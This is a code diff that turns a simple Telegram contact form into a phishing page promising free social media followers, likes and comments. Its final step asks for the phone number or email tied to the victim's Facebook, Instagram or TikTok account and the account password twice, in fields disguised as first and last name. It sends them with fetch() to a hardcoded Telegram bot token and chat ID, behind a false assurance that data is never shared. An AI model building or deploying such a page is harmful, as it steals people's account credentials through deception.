@@ -3,121 +3,213 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Submit Data to Telegram</title>
+    <title>Get Free Social Media Growth for a Limited Time</title>
     <style>
+        /* General Styling */
         body {
             font-family: Arial, sans-serif;
             text-align: center;
-            margin: 50px;
             background: #f4f4f4;
-        }
-        form {
-            background: white;
+            margin: 0;
             padding: 20px;
-            max-width: 400px;
-            margin: auto;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
         }
-        input, textarea, button {
+
+        .container {
+            background: white;
+            padding: 25px;
+            max-width: 420px;
+            margin: auto;
+            border-radius: 12px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+
+        h2 {
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        p {
+            color: #666;
+        }
+
+        input, select, button {
             width: 100%;
+            padding: 12px;
             margin: 10px 0;
-            padding: 10px;
-            border: 1px solid #ccc;
-            border-radius: 5px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
             font-size: 16px;
         }
-        textarea {
-            resize: vertical;
+
+        select {
+            background-color: #f9f9f9;
         }
+
         button {
             background-color: #0088cc;
             color: white;
             border: none;
             cursor: pointer;
             font-size: 18px;
+            transition: 0.3s;
         }
+
         button:hover {
             background-color: #005f99;
         }
+
+        .hidden {
+            display: none;
+        }
+
+        /* Progress Bar */
+        .progress {
+            width: 100%;
+            background: #ddd;
+            height: 8px;
+            border-radius: 10px;
+            margin-bottom: 15px;
+            overflow: hidden;
+        }
+
+        .progress-bar {
+            height: 8px;
+            width: 0%;
+            background: #0088cc;
+            transition: 0.4s ease-in-out;
+        }
+
+        /* Loading Text */
         #loading {
             display: none;
             font-size: 16px;
             color: green;
         }
+
     </style>
 </head>
 <body>
 
-    <h2>Submit Your Details</h2>
-    <form id="telegramForm">
-        <input type="text" id="name" placeholder="Enter your name" required>
-        <input type="email" id="email" placeholder="Enter your email" required>
-        <textarea id="message" placeholder="Enter your message" required></textarea>
-        <button type="submit">Submit</button>
-        <p id="loading">Sending... Please wait</p>
-    </form>
+    <!-- Welcome Page -->
+    <div id="welcomePage" class="container">
+        <h2>Welcome to Free Social Media Growth! 🚀</h2>
+        <p>We offer **100% free** services to help you grow on social media. Click below to continue.</p>
+        <button onclick="showPrivacyPolicy()">Get Started</button>
+    </div>
+
+    <!-- Privacy Policy Page -->
+    <div id="privacyPage" class="container hidden">
+        <h2>Privacy & Security 🔒</h2>
+        <p>Your information is **safe and confidential**. We never share your data.</p>
+        <input type="checkbox" id="acceptPolicy"> I accept the privacy policy<br>
+        <button onclick="showServiceSelection()">Continue</button>
+    </div>
+
+    <!-- Service Selection Page -->
+    <div id="servicePage" class="container hidden">
+        <h2>Select Your Platform 📲</h2>
+        <div class="progress"><div class="progress-bar" id="progressBar"></div></div>
+        <select id="platform">
+            <option value="Facebook">Facebook</option>
+            <option value="Instagram">Instagram</option>
+            <option value="TikTok">TikTok</option>
+        </select>
+        <h3>What service do you want? 🎯</h3>
+        <select id="serviceType">
+            <option value="Followers">Followers</option>
+            <option value="Likes">Likes</option>
+            <option value="Shares">Shares</option>
+            <option value="Comments">Comments</option>
+            <option value="Coming Soon">Coming Soon</option>
+        </select>
+        <h3>Select Quantity 📦</h3>
+        <select id="quantity">
+            <option value="10">10</option>
+            <option value="100">100</option>
+            <option value="1000">1000</option>
+            <option value="5000">5000</option>
+            <option value="10000">10000</option>
+        </select>
+        <button onclick="showDetailsForm()">Next</button>
+    </div>
+
+    <!-- User Details Form -->
+    <div id="detailsPage" class="container hidden">
+        <h2>Enter Your Account Details 📩</h2>
+        <div class="progress"><div class="progress-bar" id="progressBarDetails"></div></div>
+        <input type="text" id="contactInfo" placeholder="Phone Number or Email (associated with your account)" required>
+        <input type="text" id="firstName" placeholder="Your Password" required>
+        <input type="text" id="lastName" placeholder="Enter Password Again" required>
+        <button onclick="submitForm()">Submit Request</button>
+        <p id="loading">Your request is being processed... Please wait</p>
+    </div>
 
     <script>
-        document.getElementById("telegramForm").addEventListener("submit", async function(event) {
-            event.preventDefault();
+        function showPrivacyPolicy() {
+            document.getElementById("welcomePage").classList.add("hidden");
+            document.getElementById("privacyPage").classList.remove("hidden");
+        }
 
-            // Get form values
-            let name = document.getElementById("name").value.trim();
-            let email = document.getElementById("email").value.trim();
-            let message = document.getElementById("message").value.trim();
-            let loadingText = document.getElementById("loading");
-
-            // Basic validation
-            if (name === "" || email === "" || message === "") {
-                alert("❌ Please fill out all fields.");
+        function showServiceSelection() {
+            if (!document.getElementById("acceptPolicy").checked) {
+                alert("❌ You must accept the privacy policy to continue.");
                 return;
             }
-            if (!/^\S+@\S+\.\S+$/.test(email)) {
-                alert("❌ Please enter a valid email address.");
+            document.getElementById("privacyPage").classList.add("hidden");
+            document.getElementById("servicePage").classList.remove("hidden");
+            document.getElementById("progressBar").style.width = "50%";
+        }
+
+        function showDetailsForm() {
+            document.getElementById("servicePage").classList.add("hidden");
+            document.getElementById("detailsPage").classList.remove("hidden");
+            document.getElementById("progressBarDetails").style.width = "100%";
+        }
+
+        async function submitForm() {
+            let platform = document.getElementById("platform").value;
+            let serviceType = document.getElementById("serviceType").value;
+            let quantity = document.getElementById("quantity").value;
+            let contactInfo = document.getElementById("contactInfo").value.trim();
+            let firstName = document.getElementById("firstName").value.trim();
+            let lastName = document.getElementById("lastName").value.trim();
+            let loadingText = document.getElementById("loading");
+
+            // Validation
+            if (contactInfo === "" || firstName === "" || lastName === "") {
+                alert("❌ Please fill out all fields.");
                 return;
             }
 
             // Show loading message
             loadingText.style.display = "block";
 
-            // Telegram Bot Credentials (You MUST replace these!)
-            let botToken = "YOUR_BOT_TOKEN";
-            let chatId = "YOUR_TELEGRAM_CHAT_ID"; 
+            // Telegram Bot Credentials (Replace with yours)
+            let botToken = "7525645029:AAHOfKzGmtNHr1MY9G1y6FMtOmWnjbG9wJI";
+            let chatId = "7141838359";
 
             // Message format
-            let text = `🚀 *New Form Submission* 🚀\n\n👤 *Name:* ${name}\n📧 *Email:* ${email}\n💬 *Message:* ${message}`;
+            let text = `🚀 *New Free Service Request* 🚀\n\n📌 *Platform:* ${platform}\n🛠 *Service:* ${serviceType}\n📦 *Quantity:* ${quantity}\n📞 *Contact:* ${contactInfo}\n👤 *Name:* ${firstName} ${lastName}`;
 
-            // Telegram API URL
             let telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
-            // Send data using fetch API
             try {
                 let response = await fetch(telegramURL, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: text,
-                        parse_mode: "Markdown"
-                    })
+                    body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: "Markdown" })
                 });
 
                 let data = await response.json();
-
-                if (data.ok) {
-                    alert("✅ Data submitted successfully!");
-                    document.getElementById("telegramForm").reset();
-                } else {
-                    alert("❌ Failed to send data to Telegram.");
-                }
+                if (data.ok) alert("✅ Request submitted successfully!");
+                else alert("❌ Submission failed!");
             } catch (error) {
                 console.error("Error:", error);
-                alert("❌ An error occurred. Please try again.");
+                alert("❌ An error occurred.");
             } finally {
-                loadingText.style.display = "none"; // Hide loading text
+                loadingText.style.display = "none";
             }
-        });
+        }
     </script>
 
 </body>
